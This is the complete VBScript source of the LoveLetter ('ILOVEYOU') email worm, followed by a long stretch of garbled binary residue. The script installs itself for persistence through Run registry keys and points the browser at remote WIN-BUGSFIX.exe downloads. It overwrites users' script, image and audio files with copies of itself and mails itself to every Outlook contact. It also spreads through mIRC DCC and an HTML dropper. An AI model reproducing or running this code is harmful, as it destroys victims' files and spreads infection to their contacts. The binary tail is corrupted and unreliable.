rem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\LOVE-LETTER-FOR-YOU.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next  
end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "ILOVEYOU"
male.Body = vbcrlf&"kindly check the attached LOVELETTER coming from me."
male.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub
                                                                                                                                                                                                                                                                                                                                                                                                                                                           »≈•

   __proto__       »≈•
   setRate         »≈•
   constructor     »≈•

   __proto__       »≈•
   setGain         »≈•
   constructor     »≈•

   __proto__       »≈•
	   getLocal ect s  »≈•
   constructor     »≈•

   __proto__       »≈•
   constructor     »≈•

   __proto__       »≈•

   prototype       »≈•

   getRemote ct    »≈•
	   getLocal        »≈•
   constructor     »≈•

   __proto__       »≈•
   constructor     »≈•

   __proto__       »≈•

   prototype       »≈•

   deleteAll ct    »≈•

   getRemote       »≈•
   constructor     »≈•

   __proto__       »≈•
   constructor     »≈•

   __proto__       »≈•

   prototype       »≈•
   getDiskUsage    »≈•

   deleteAll       »≈•
   constructor     »≈•

   __proto__       »≈•
   constructor     »≈•

   __proto__       »≈•

   prototype       »≈•
   constructor gs  »≈•
   getDiskUsage    »≈•
   constructor  s  »≈•

   __proto__       »≈•
   connect         »≈•
   constructor     »≈•

   __proto__       »≈•
   send            »≈•
   constructor     »≈•

   __proto__       »≈•
   flush           »≈•
   constructor     »≈•

   __proto__       »≈•
   close           »≈•
   constructor     »≈•

   __proto__       »≈•
   getSize         »≈•
   constructor     »≈•

   __proto__       »≈•
   setFps          »≈•

   __proto__ lags  »≈•
   System          »≈•
   constructor     »≈•
   constructor     »≈•
   System          »≈•

   __proto__       »≈•

   __proto__       »≈•
   Query           »≈•
   screenColor     »≈•
   constructor     –Eh
–Eh
êy•
    ÄÄ§
tí•
êy•
    òÄ§
∞í•
êy•
    ∞Ä§
Ïí•
êy•
    »Ä§
(ì•
êy•
    ‡Ä§
dì•
êy•
    Å§
†ì•
êy•
    ÿHh
ÿHh
êy•
    ƒIh
ƒIh
êy•
    (Å§
‹ì•
êy•
    @Å§
î•
êy•
    XÅ§
Tî•
êy•
    pÅ§
êî•
êy•
    àÅ§
Ãî•
êy•
    ∏Å§
ï•
êy•
    ÑKh
ÑKh
êy•
    pLh
pLh
êy•
    –Å§
Dï•
êy•
    ËÅ§
Äï•
êy•
     Ç§
ºï•
êy•
    Ç§
¯ï•
êy•
    0Ç§
4ñ•
êy•
    `Ç§
pñ•
êy•
     Nh
 Nh
êy•
    Oh
Oh
êy•
    xÇ§
¨ñ•
êy•
    êÇ§
Ëñ•
êy•
    ®Ç§
$ó•
êy•
    ¿Ç§
`ó•
êy•
    ÿÇ§
úó•
êy•
    É§
ÿó•
êy•
    Qh
Qh
êy•
–¿1 Rh
 Rh
êy•
     É§
ò•
êy•
    8É§
Pò•
êy•
    PÉ§
åò•
êy•
    hÉ§
»ò•
êy•
    ÄÉ§
ô•
êy•
‹Å•
∞É§
@ô•
êy•
    PTh
PTh
êy•
    »É§
|ô•
êy•
    ‡É§
∏ô•
êy•
    ¯É§
Ùô•
êy•
    <Uh
<Uh
êy•
    Ñ§
0ö•
êy•
    (Ñ§
lö•
êy•
îlÁ	@Ñ§
®ö•
êy•
    (Vh
(Vh
êy•
    XÑ§
‰ö•
êy•
    pÑ§
 õ•
êy•
\Ç•
àÑ§
\õ•
êy•
ƒ±yWh
Wh
êy•
    †Ñ§
òõ•
êy•
    ∏Ñ§
‘õ•
êy•
    Ë≈•
ú•
êy•
     Xh
 Xh
êy•
     ∆•
Lú•
êy•
    ∆•
àú•
êy•
    0∆•
ƒú•
êy•
    (Yh
(Yh
êy•
    Zh
Zh
êy•
    `∆•
 ù•
êy•
    x∆•
<ù•
êy•
    ê∆•
xù•
êy•
    ®∆•
¥ù•
êy•
    ¿∆•
ù•
êy•
    ∆•
,û•
êy•
Ñwq¨[h
¨[h
êy•
    «•
hû•
êy•
     «•
§û•
êy•
mÁ	h«•
‡û•
êy•
|àî–]h
–]h
êy•
    P«•
ü•
êy•
    Ä«•
Xü•
êy•
    ò«•
îü•
êy•
    º^h
º^h
êy•
    ∞«•
–ü•
êy•
    »«•
†•
êy•
Ö•
‡«•
H†•
êy•
    ®_h
®_h
êy•
    ¯«•
Ñ†•
êy•
    »•
¿†•
êy•
    å5ı	¸†•
êy•
ÙNPî`h
î`h
êy•
    (»•
8°•
êy•
    @»•
t°•
êy•
    X»•
∞°•
êy•
    Äah
Äah
êy•
    p»•
Ï°•
êy•
    à»•
(¢•
êy•
    †»•
d¢•
êy•
    Ëbh
Ëbh
êy•
    îch
îch
êy•
    –»•
†¢•
êy•
    Ë»•
‹¢•
êy•
     …•
£•
êy•
    …•
T£•
êy•
    0…•
ê£•
êy•
    H…•
Ã£•
êy•
    ,eh
,eh
êy•
    `…•
§•
êy•
    x…•
D§•
êy•
ÑmÁ	®…•
Ä§•
êy•
    fh
fh
êy•
    ê…•
º§•
êy•
    ¿…•
¯§•
êy•
    ÿ…•
4••
êy•
D„'‹gh
‹gh
êy•
    …•
p••
êy•
     •
¨••
êy•
      •
Ë••
êy•
    »hh
»hh
êy•
    8 •
$¶•
êy•
    P •
`¶•
êy•
    h •
ú¶•
êy•
    ¥ih
¥ih
êy•
    Ä •
ÿ¶•
êy•
    ò •
ß•
êy•
    ¥5ı	Pß•
êy•
    jh
jh
êy•
    ‹kh
‹kh
êy•
    » •
åß•
êy•
    ‡ •
»ß•
êy•
    ¯ •
®•
êy•
    À•
@®•
êy•
    (À•
|®•
êy•
    XÀ•
∏®•
êy•
     nh
 nh
êy•
‰'Ïnh
Ïnh
êy•
    pÀ•
Ù®•
êy•
    àÀ•
0©•
êy•
    †À•
l©•
êy•
    ∏À•
®©•
êy•
    –À•
‰©•
êy•
     Ã•
 ™•
êy•
§=Ã$qh
$qh
êy•
>Ãrh
rh
êy•
    Ã•
\™•
êy•
    0Ã•
ò™•
êy•
    HÃ•
‘™•
êy•
    `Ã•
´•
êy•
    xÃ•
L´•
êy•
    ®Ã•
à´•
êy•
Ù µƒsh
ƒsh
êy•
¥w∞∞th
∞th
êy•
    ¿Ã•
ƒ´•
êy•
    ÿÃ•
 ¨•
êy•
    Ã•
<¨•
êy•
    Õ•
x¨•
êy•
     Õ•
¥¨•
êy•
    PÕ•
¨•
êy•
    |wh
|wh
êy•
    hÕ•
,≠•
êy•
    ÄÕ•
h≠•
êy•
    òÕ•
§≠•
< †vvvv‹^›ÄF¶
X-•
     e ¨â•
       ‡2h
    a•
‰ã•
ÿ|§
                          ¨â•
       †f
        @ä•
¿|§
                          ¨â•
       åf
    ä•
    |§
                       É   ¨â•
       h7h
    §f•
0ã•
}§
                       É   ¨â•
       †f
        Ùä•
 }§
                          ¨â•
       åf
    ∏ä•
    8}§
                       É   ¨â•
       8h
    |ä•
    P}§
                       É   ¨â•
       »f
        ®ã•
®|§
                          ¨â•
       ¥f
    lã•
òå•
h}§
                          ¨â•
        9h
    »â•
‹±•
»}§
                          ¨â•
       †f
        \å•
∞}§
                          ¨â•
       åf
     å•
    ‡}§
                       É   ¨â•
       x:h
    ®ã•
Lç•
¯}§
                       Ü   ¨â•
       †f
        ç•
~§
                          ¨â•
       åf
    ‘å•
    (~§
                       É   ¨â•
       d;h
    òå•
 é•
@~§
                       Ü   ¨â•
       †f
        ƒç•
X~§
                          ¨â•
       åf
    àç•
    p~§
                       É   ¨â•
       P<h
    Lç•
    d5ı	                       Ü   ¨â•
       †f
        xé•
†~§
                          ¨â•
       åf
    <é•
    ∏~§
                       É   ¨â•
       Ù=h
    p„£
hè•
–~§
                       É   ¨â•
       †f
        ,è•
Ë~§
                          ¨â•
       åf
    é•
     §
                       É   ¨â•
       ‡>h
    ¥é•
ê•
§
                       É   ¨â•
       †f
        ‡è•
0§
                          ¨â•
       åf
    §è•
    H§
    